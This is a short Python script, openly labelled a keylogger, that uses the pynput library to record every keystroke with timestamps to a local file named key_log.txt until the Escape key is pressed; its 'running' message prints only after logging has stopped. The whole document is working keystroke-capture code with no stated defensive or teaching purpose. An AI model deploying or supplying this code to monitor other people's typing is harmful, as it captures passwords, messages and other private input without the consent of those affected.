from pynput.keyboard import Key, Listener
import logging

# Set up the log file to store keystrokes
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Define function to log each key press
def on_press(key):
    try:
        logging.info(str(key.char))  # Logs printable characters
    except AttributeError:
        logging.info(str(key))  # Logs special keys like space, enter, etc.

# Define function to stop the keylogger on escape key press
def on_release(key):
    if key == Key.esc:
        return False  # Stops listener

# Start listening to the keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"Keylogger running... Press 'ESC' to stop and save the log to {log_file}")
